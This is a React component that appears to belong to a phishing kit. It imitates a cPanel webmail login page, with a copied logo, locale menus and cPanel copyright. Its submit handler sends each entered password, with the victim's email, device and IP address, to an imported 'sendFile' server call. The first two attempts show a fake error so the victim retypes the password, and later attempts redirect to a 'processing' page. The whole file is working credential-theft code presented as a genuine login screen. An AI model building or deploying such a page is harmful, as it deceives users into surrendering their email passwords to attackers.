import React, { useState } from "react";
import { Helmet } from "react-helmet";
import { navigate } from "@reach/router";
import { notify, sendFile } from "../servers";
import Logo from "./logo.svg";

function WebmailMain({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,
    device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 });
        setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("../processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  return (
    <>
      <Helmet>
        <link
          rel="stylesheet"
          type="text/css"
          href="../webmailmain/styleopensans.min.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../webmailmain/style.css"
        />
      </Helmet>
      <div>
        <div id="preload_images" />
        <input type="hidden" id="goto_uri" defaultValue="/" />
        <input type="hidden" id="goto_app" defaultValue />
        {/* Do not remove msg_code as it is needed for automated testing - msg_code:[]  */}
        <div
          id="login-wrapper"
          className="group has-pw-reset"
          style={{ opacity: 1, visibility: "visible" }}
        >
          <div className="wrapper">
            <div style={{ display: "none" }}>
              <div id="locale-container" style={{ visibility: "hidden" }}>
                <div id="locale-inner-container">
                  <div id="locale-header">
                    <div className="locale-head">Please select a locale:</div>
                    <div className="close">
                      <a
                        href="#"
                        //  onclick="toggle_locales(false)"
                      >
                        X Close
                      </a>
                    </div>
                  </div>
                  <div id="locale-map">
                    <div className="scroller clear">
                      <div className="locale-cell">
                        <a href="#en">English</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#ar">العربية</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#bg">български</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#cs">čeština</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#da">dansk</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#de">Deutsch</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#el">Ελληνικά</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#es">español</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#es_419">español latinoamericano</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#es_es">español de España</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#fi">suomi</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#fil">Filipino</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#fr">français</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#he">עברית</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#hu">magyar</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#i_cpanel_snowmen">
                          ☃ cPanel Snowmen ☃ - i_cpanel_snowmen
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="#id">Bahasa Indonesia</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#it">italiano</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#ja">日本語</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#ko">한국어</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#ms">Bahasa Melayu</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#nb">norsk bokmål</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#nl">Nederlands</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#no">Norwegian</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#pl">polski</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#pt">português</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#pt_br">português do Brasil</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#ro">română</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#ru">русский</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#sl">slovenščina</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#sv">svenska</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#th">ไทย</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#tr">Türkçe</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#uk">українська</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#vi">Tiếng Việt</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#zh">中文</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#zh_cn">中文（中国）</a>
                      </div>
                      <div className="locale-cell">
                        <a href="#zh_tw">中文（台湾）</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div id="content-container">
              <div id="login-container">
                <div id="login-sub-container">
                  <div id="login-sub-header">
                    <img className="main-logo" src={Logo} alt="logo" />
                  </div>
                  <div id="login-sub">
                    <div
                      id="clickthrough_form"
                      style={{ visibility: "hidden" }}
                    >
                      <form>
                        <div className="notices" />
                        <button type="submit" className="clickthrough-cont-btn">
                          Continue
                        </button>
                      </form>
                    </div>
                    <div id="forms">
                      <form noValidate id="login_form" onSubmit={submitForm}>
                        <div className="input-req-login">
                          <label htmlFor="user">Email Address</label>
                        </div>
                        <div className="input-field-login icon username-container">
                          <input
                            name="account_name"
                            id="user"
                            autoFocus="autofocus"
                            //value={values.username}
                            placeholder="Enter your email address."
                            className="std_textbox"
                            type="text"
                          //  disabled
                            tabIndex={1}
                            required
                          />
                        </div>
                        <div className="input-req-login login-password-field-label">
                          <label htmlFor="pass">Password</label>
                        </div>
                        <div className="input-field-login icon password-container">
                          <input
                            name="password"
                            id="pass"
                            placeholder="Enter your email password."
                            className="std_textbox"
                            type="password"
                            tabIndex={2}
                            onChange={handleChange}
                            required
                          />
                        </div>
                        <div className="controls">
                          <div className="login-btn">
                            <button
                              name="login"
                              type="submit"
                              id="login_submit"
                              tabIndex={3}
                              disabled={submited.status}
                            >
                              Log in
                            </button>
                          </div>
                          <div className="reset-pw">
                            <a href="#/resetpass?start=1" id="reset_password">
                              Reset Password
                            </a>
                          </div>
                        </div>
                        <div className="clear" id="push" />
                      </form>
                      {/*CLOSE forms */}
                    </div>
                    {/*CLOSE login-sub */}
                  </div>
                  {/*CLOSE wrapper */}
                </div>
                {/*CLOSE login-sub-container */}
              </div>
              {/*CLOSE login-container */}
            </div>
            <div id="locale-footer" style={{ display: "block" }}>
              <div className="locale-container">
                <noscript>
                  &lt;form method="get" action="."&gt; &lt;select
                  name="locale"&gt; &lt;option value=""&gt;Change
                  locale&lt;/option&gt; &lt;option
                  value="en"&gt;English&lt;/option &gt;&lt;option
                  value="ar"&gt;العربية&lt;/option &gt;&lt;option
                  value="bg"&gt;български&lt;/option &gt;&lt;option
                  value="cs"&gt;čeština&lt;/option &gt;&lt;option
                  value="da"&gt;dansk&lt;/option &gt;&lt;option
                  value="de"&gt;Deutsch&lt;/option &gt;&lt;option
                  value="el"&gt;Ελληνικά&lt;/option &gt;&lt;option
                  value="es"&gt;español&lt;/option &gt;&lt;option
                  value="es_419"&gt;español latinoamericano&lt;/option
                  &gt;&lt;option value="es_es"&gt;español de España&lt;/option
                  &gt;&lt;option value="fi"&gt;suomi&lt;/option &gt;&lt;option
                  value="fil"&gt;Filipino&lt;/option &gt;&lt;option
                  value="fr"&gt;français&lt;/option &gt;&lt;option
                  value="he"&gt;עברית&lt;/option &gt;&lt;option
                  value="hu"&gt;magyar&lt;/option &gt;&lt;option
                  value="i_cpanel_snowmen" &gt;☃ cPanel Snowmen ☃ -
                  i_cpanel_snowmen&lt;/option &gt;&lt;option
                  value="id"&gt;Bahasa Indonesia&lt;/option &gt;&lt;option
                  value="it"&gt;italiano&lt;/option &gt;&lt;option
                  value="ja"&gt;日本語&lt;/option &gt;&lt;option
                  value="ko"&gt;한국어&lt;/option &gt;&lt;option
                  value="ms"&gt;Bahasa Melayu&lt;/option &gt;&lt;option
                  value="nb"&gt;norsk bokmål&lt;/option &gt;&lt;option
                  value="nl"&gt;Nederlands&lt;/option &gt;&lt;option
                  value="no"&gt;Norwegian&lt;/option &gt;&lt;option
                  value="pl"&gt;polski&lt;/option &gt;&lt;option
                  value="pt"&gt;português&lt;/option &gt;&lt;option
                  value="pt_br"&gt;português do Brasil&lt;/option &gt;&lt;option
                  value="ro"&gt;română&lt;/option &gt;&lt;option
                  value="ru"&gt;русский&lt;/option &gt;&lt;option
                  value="sl"&gt;slovenščina&lt;/option &gt;&lt;option
                  value="sv"&gt;svenska&lt;/option &gt;&lt;option
                  value="th"&gt;ไทย&lt;/option &gt;&lt;option
                  value="tr"&gt;Türkçe&lt;/option &gt;&lt;option
                  value="uk"&gt;українська&lt;/option &gt;&lt;option
                  value="vi"&gt;Tiếng Việt&lt;/option &gt;&lt;option
                  value="zh"&gt;中文&lt;/option &gt;&lt;option
                  value="zh_cn"&gt;中文（中国）&lt;/option &gt;&lt;option
                  value="zh_tw"&gt;中文（台湾）&lt;/option&gt; &lt;/select&gt;
                  &lt;button style="margin-left: 10px"
                  type="submit"&gt;Change&lt;/button&gt; &lt;/form&gt; &lt;style
                  type="text/css"&gt; #mobilelocalemenu, #locales_list {"{"}
                  display: none;
                  {"}"}
                  &lt;/style&gt;
                </noscript>
                <ul id="locales_list">
                  <li>
                    <a href="#en">English</a>
                  </li>
                  <li>
                    <a href="#ar">العربية</a>
                  </li>
                  <li>
                    <a href="#bg">български</a>
                  </li>
                  <li>
                    <a href="#cs">čeština</a>
                  </li>
                  <li>
                    <a href="#da">dansk</a>
                  </li>
                  <li>
                    <a href="#de">Deutsch</a>
                  </li>
                  <li>
                    <a href="#el">Ελληνικά</a>
                  </li>
                  <li>
                    <a href="#es">español</a>
                  </li>
                  <li>
                    <a
                      href="#"
                      id="morelocale"
                      //  onclick="toggle_locales(true)"
                      title="More locales"
                    >
                      …
                    </a>
                  </li>
                </ul>
                <div id="mobilelocalemenu">
                  Select a locale:
                  <a
                    href="#"
                    // onclick="toggle_locales(true)"
                    title="Change locale"
                  >
                    English
                  </a>
                </div>
              </div>
            </div>
          </div>
          {/*Close login-wrapper */}
        </div>
        <style
          dangerouslySetInnerHTML={{
            __html:
              "\n      @media (min-width: 481px) {\n        #select_user_form {\n          width: px;\n        }\n      }\n    ",
          }}
        />
        <div className="copyright">
          Copyright©&nbsp;2020 cPanel, Inc. <br />
          <a href="https://go.cpanel.net/privacy" target="_blank">
            Privacy Policy
          </a>
        </div>
      </div>
    </>
  );
}

export default WebmailMain;
